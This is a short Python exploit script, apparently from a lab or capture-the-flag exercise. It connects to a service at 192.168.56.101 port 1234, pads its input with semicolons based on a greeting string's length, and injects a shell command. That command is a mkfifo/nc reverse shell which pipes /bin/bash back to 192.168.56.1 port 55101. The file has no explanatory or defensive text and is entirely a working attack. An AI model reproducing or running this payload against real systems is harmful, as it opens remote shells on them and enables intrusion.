import socket
import sys

# Constants
n_as = 128 - len('Hello, dear ')
cmd_str = b"mkfifo /tmp/dkkr; nc 192.168.56.1 55101 0</tmp/dkkr | /bin/bash >/tmp/dkkr 2>&1; rm /tmp/dkkr"

# Inspired from: http://pymotw.com/2/socket/tcp.html
# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to the port
server_address = ('192.168.56.101', 1234)
sock.connect(server_address)

# Sends data
try:
    data = sock.recv(1024)

    message = b';' * n_as
    message += cmd_str

    sock.sendall(message)
    
    data = sock.recv(1024)
    input("Type enter to close.")
finally:
    print("Closing socket!")
    sock.close()